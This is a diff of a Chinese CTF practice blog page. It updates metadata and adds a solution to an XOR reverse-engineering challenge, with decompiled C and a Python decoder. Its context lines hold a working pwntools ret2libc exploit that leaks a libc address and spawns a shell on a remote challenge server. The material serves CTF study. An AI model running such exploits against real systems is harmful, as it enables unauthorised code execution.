@@ -45,7 +45,7 @@
 <meta property="og:image" content="http://yyyffff.github.io/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/101cbb9fca898724fe6858dcc3b651fa.png">
 <meta property="og:image" content="http://yyyffff.github.io/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1754115919807.png">
 <meta property="article:published_time" content="2025-02-19T07:12:47.000Z">
-<meta property="article:modified_time" content="2025-10-16T14:32:46.016Z">
+<meta property="article:modified_time" content="2025-11-19T10:09:58.959Z">
 <meta property="article:author" content="yyyffff">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://yyyffff.github.io/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1738725643074.png">
@@ -254,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          8k 字
+          8.3k 字
         
       </span>
     
@@ -265,7 +265,7 @@
         
         
         
-          67 分钟
+          70 分钟
         
       </span>
     
@@ -762,17 +762,19 @@
 <p>栈溢出，给了栈地址，就想能不能做 ret2shellcode，然后在本地通了，但是远程很奇怪，连接后不发送任何东西是没有输出的，跟我在本地完全不一样，看了看网上的 wp，发现大家都差不多，最后远程用 ret2libc 通了</p>
 <h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27110</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./l1&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>r.sendline(payload)<br>write_addr=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system_addr)+p32(main_addr)+p32(binsh_addr)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
 
+<h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><h2 id="IDA-8"><a href="#IDA-8" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+2Ch] [rbp-124h]</span><br>  <span class="hljs-type">char</span> __b[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-110h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(__b, <span class="hljs-number">0</span>, <span class="hljs-number">0x100u</span>LL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input your flag:\n&quot;</span>);<br>  get_line(__b, <span class="hljs-number">256LL</span>);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(__b) != <span class="hljs-number">0x21</span> )<br>    <span class="hljs-keyword">goto</span> LABEL_7;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">33</span>; ++i )<br>    __b[i] ^= __b[i - <span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(__b, global, <span class="hljs-number">0x21u</span>LL) )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>LABEL_7:<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
+<p>对于第0位，flag[0]&#x3D;global[0]&#x3D;’f’</p>
+<p>可以看到从1开始，而 flag[i]^flag[i-1]&#x3D;global[i]，而 global 已知</p>
+<p>那么我们就可以从过异或的特性 a^a&#x3D;0,a^b&#x3D;c，则 a^b^b&#x3D;c^b–&gt;a&#x3D;c^b</p>
+<p>而加密过程（ 在加密的时候，**__b[i-1] 已经是加密后的 enc[i-1]**，不是原始 flag[i-1]。 ）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">enc[<span class="hljs-number">0</span>] = flag[<span class="hljs-number">0</span>]<br>enc[<span class="hljs-number">1</span>] = flag[<span class="hljs-number">1</span>] ^ enc[<span class="hljs-number">0</span>]<br>enc[<span class="hljs-number">2</span>] = flag[<span class="hljs-number">2</span>] ^ enc[<span class="hljs-number">1</span>]<br>enc[<span class="hljs-number">3</span>] = flag[<span class="hljs-number">3</span>] ^ enc[<span class="hljs-number">2</span>]<br>...<br></code></pre></td></tr></table></figure>
 
+<p>然后我们就可以通过异或的特性来解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">flag[i] = enc[i] ^ enc[i-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure>
 
-
-
-
-
-
-
-
-
+<p>然后我们就可以解出flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>data=[<span class="hljs-number">0x66</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x77</span> ,<span class="hljs-number">0x26</span> ,<span class="hljs-number">0x4F</span> ,<span class="hljs-number">0x2E</span> ,<span class="hljs-number">0x40</span> ,<span class="hljs-number">0x11</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x0D</span> ,<span class="hljs-number">0x5A</span> ,<span class="hljs-number">0x3B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0x11</span> ,<span class="hljs-number">0x70</span> ,<span class="hljs-number">0x19</span> ,<span class="hljs-number">0x46</span> ,<span class="hljs-number">0x1F</span> ,<span class="hljs-number">0x76</span> ,<span class="hljs-number">0x22</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0x23</span> ,<span class="hljs-number">0x44</span> ,<span class="hljs-number">0x0E</span>, <span class="hljs-number">0x67</span> ,<span class="hljs-number">0x06</span> ,<span class="hljs-number">0x68</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x47</span> ,<span class="hljs-number">0x32</span> ,<span class="hljs-number">0x4F</span>]<br>flag=<span class="hljs-built_in">chr</span>(data[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(data))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(data)):<br>    flag+=<span class="hljs-built_in">chr</span>(data[i]^data[i-<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
                 
               </div>
             
